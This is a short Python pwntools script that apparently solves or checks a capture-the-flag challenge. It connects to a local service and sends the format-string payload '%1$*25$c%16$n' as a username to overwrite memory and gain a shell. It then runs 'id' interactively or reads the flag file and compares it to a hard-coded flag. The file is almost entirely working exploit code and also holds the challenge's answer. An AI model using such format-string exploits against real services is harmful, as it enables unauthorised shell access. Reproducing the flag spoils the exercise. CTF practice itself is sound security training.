#!/usr/bin/env python2

from pwn import *
import md5
import sys

HOST = '127.0.0.1'
PORT = 11111
FLAG = 'midnight{gl1tch3s_Ge7_sT1tCh3z}'

DEBUG = False

host = HOST
if len(sys.argv) > 1:
	host = sys.argv[1]

port = PORT
if len(sys.argv) > 2:
	port = sys.argv[2]

if len(sys.argv) > 3:
	DEBUG = True

io = remote(host, port)

io.recvuntil("username: ")
io.sendline("%1$*25$c%16$n")
io.recvuntil("pin code: ")
io.sendline("0")

io.recvuntil("0\n")
io.recvline()

if DEBUG == True:

	log.success('got shell?')
	io.sendline('id')
	io.info(io.recvline().strip())

	io.interactive()

else:

	io.sendline('cat flag')
	if io.recvline().strip() != FLAG:
		log.failure('fail')
		sys.exit(-1)
	else:
		log.success('pass')
		sys.exit(0)

